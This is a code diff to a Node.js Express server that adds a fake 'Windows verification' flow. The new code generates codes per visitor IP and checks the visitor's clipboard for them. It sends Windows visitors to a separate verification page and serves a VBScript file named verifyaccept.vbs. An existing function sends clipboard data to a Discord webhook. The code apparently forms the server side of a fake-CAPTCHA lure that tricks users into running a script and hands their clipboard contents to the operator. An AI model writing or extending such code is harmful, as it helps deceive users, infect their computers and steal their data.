@@ -1,3 +1,4 @@
+
 require('dotenv').config();
 const express = require('express');
 const fs = require('fs');
@@ -12,6 +13,7 @@ app.use(express.static('public'));
 app.set('view engine', 'html');
 app.engine('html', require('ejs').renderFile);
 
+
 // Middleware to get real IP address
 function getRealIP(req) {
   return req.headers['x-forwarded-for'] || 
@@ -21,6 +23,53 @@ function getRealIP(req) {
          (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
          req.ip;
 }
+
+// Handle Windows verification
+const codeMap = {}; // Stores IP -> code
+
+app.get('/generate-verification-code', (req, res) => {
+  const ip = getRealIP(req);
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let code = "";
+  for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
+  code += "-";
+  for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
+  codeMap[ip] = code;
+  res.json({ code });
+});
+
+app.post('/verify-windows-code', (req, res) => {
+  const ip = getRealIP(req);
+  const { clipboard } = req.body;
+  const expectedCode = codeMap[ip];
+  if (!expectedCode) return res.status(400).json({ success: false, error: "No code generated." });
+  if (!clipboard.includes(expectedCode)) return res.status(401).json({ success: false, message: "Verification failed." });
+  res.cookie('windowsVerified', '1', { httpOnly: true });
+  res.json({ success: true });
+});
+
+// Serve verification pages
+app.get('/verify', (req, res) => {
+  const userAgent = req.headers['user-agent'] || '';
+  if (userAgent.includes("Windows")) {
+    if (req.cookies && req.cookies.windowsVerified === '1') {
+      return res.redirect('/verifynotwindows');
+    } else {
+      return res.redirect('/verify-windows');
+    }
+  } else {
+    return res.redirect('/verifynotwindows');
+  }
+});
+
+// Static routes
+app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
+app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));
+app.get('/verifyaccept.vbs', (req, res) => {
+  res.set('Content-Type', 'application/x-vbs');
+  res.sendFile(path.join(__dirname, 'public/verifyaccept.vbs'));
+});
+
 
 // Function to send data to Discord webhook
 function sendToDiscord(data, type = 'clipboard') {
